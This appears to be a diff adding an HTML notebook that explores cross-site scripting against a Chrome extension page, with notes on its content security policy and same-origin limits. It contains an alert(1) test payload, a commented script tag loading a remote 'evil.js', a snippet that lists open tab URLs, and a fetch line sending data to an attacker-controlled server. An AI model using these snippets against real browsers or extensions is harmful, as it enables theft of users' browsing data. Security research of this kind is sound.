@@ -1,0 +1,58 @@
+<div>
+	<!-- <textarea id="input" style="height: 200px; width: 400px;"></textarea> -->
+	<!-- <br> -->
+	<!-- <button type="button">run code</button> -->
+	<!-- <br> -->
+	i'm an extension that injects HTML into a page!
+	<br>
+	<!--<button onclick="document.body.background-color = blue">xss example</button>-->
+	<script>alert(1)</script>
+	<!-- <script src="alert.js"></script> -->  <!-- yeah this executes fine -->
+	<!-- <script src="https://klatz.co/evil.js"></script> --> <!-- fails if no corresponding csp -->
+<pre>
+// opens extension html in new tab
+// run me on example.com
+// get ID from chrome://extensions
+window.open("chrome-extension://EXTENSION_ID_GOES_HERE/inject.html")
+</pre>
+
+	<br>
+	(we'll use the console to simulate XSS)
+	<br>
+	keep in mind: <b>we can XSS on both example.com and chrome-extension://</b>
+	<br>
+	however, chrome-extension is subject to the extension's CSP, and applies a reasonably-tight default one. chrome will also block blatantly-insecure CSPs like 'unsafe-inline'
+	<!-- ooh actually we can't execute XSS returned in the page -->
+	<!-- chrome-extension has a strict CSP -->
+	<!-- you can execute js that shipped with the extension, -->
+	<!-- but it seems like they endeavor to prevent the execution of dynamic JS -->
+	<br>
+	communicating between the frames is constrained by SOP. unless there's a vulnerable postmessage handler
+	<br>
+	example.com &amp; the extension don't need to talk to each other to exfil data
+<!--     <p id="output" style="height: 200px; width: 400px; background-color: grey">
+    </p> -->
+<pre>
+// dumps URLs to extension's execution context
+// run me in the opened chrome-extension:// window
+chrome.tabs.query({"active": false, "lastFocusedWindow": true}, function (tabs) {
+	for (let tab of tabs) {
+		console.log(tab.url)
+	}
+});
+</pre>
+
+<!-- how do these two talk to ea other? xss in example.com to the browser extension tab? -->
+<!-- okay so this is constrained by SOP since they're separate frames -->
+
+<pre>
+// lastly, exfil
+// modulo csp / sop / httponly on cookies
+var data_to_exfil = "foo";
+// make sure Access-Control-Allow-Origin: *
+fetch("https://some-server-i-control.com/" + data_to_exfil)
+</pre>
+
+<!-- also i think you could probably exfil it out by getting back to the example.com tab? -->
+
+</div>
